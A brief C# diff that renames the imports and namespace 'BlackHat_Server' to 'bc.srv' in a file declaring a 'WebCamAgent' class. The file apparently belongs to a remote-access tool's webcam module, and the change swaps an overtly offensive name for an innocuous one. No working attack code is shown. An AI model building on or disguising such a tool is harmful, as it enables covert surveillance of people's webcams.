@@ -1,9 +1,9 @@
 ﻿using System.Net.Sockets;
 using System.Threading;
-using BlackHat_Server.Class;
-using BlackHat_Server.Class.Comunicator;
+using bc.srv.Class;
+using bc.srv.Class.Comunicator;
 
-namespace BlackHat_Server.Muduli.WebCam
+namespace bc.srv.Muduli.WebCam
 {
     internal class WebCamAgent
     {
